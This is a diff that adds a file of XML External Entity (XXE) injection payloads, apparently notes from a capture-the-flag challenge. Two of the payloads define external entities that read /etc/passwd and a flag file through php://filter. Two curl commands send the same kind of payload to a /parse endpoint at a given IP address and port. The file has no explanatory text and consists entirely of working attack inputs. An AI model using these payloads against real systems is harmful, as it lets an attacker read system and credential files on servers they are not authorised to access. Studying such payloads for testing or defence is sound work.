@@ -1,0 +1,36 @@
+1.................................................
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [
+<!ELEMENT foo ANY>
+ <!ENTITY xxe SYSTEM
+ "file:///etc/passwd">
+ ]>
+ <foo>
+&xxe;
+ </foo>
+
+2...........................................................
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [
+<!ELEMENT foo ANY>
+ <!ENTITY xxe SYSTEM
+ "php://filter/convert.base64-encode/resource=/var/www/html/flag">
+ ]>
+ <foo>
+&xxe;
+ </foo>
+
+
+curl -D- -XGET 'http://35.246.217.46:30455/parse' --data '<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY exfiltrate SYSTEM "php://filter/convert.iconv.utf-16le.utf-8/resource=/var/www/html/flag">
+]>
+<foo>&exfiltrate;</foo>'
+
+curl -D- -XGET 'http://35.246.217.46:30455/parse' --data '<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+   <!ELEMENT foo ANY >
+   <!ENTITY exfiltrate SYSTEM "php://filter/convert.iconv.utf-16le.utf-8/resource=/var/www/html/flag">
+]>
+<foo>&exfiltrate;</foo>'
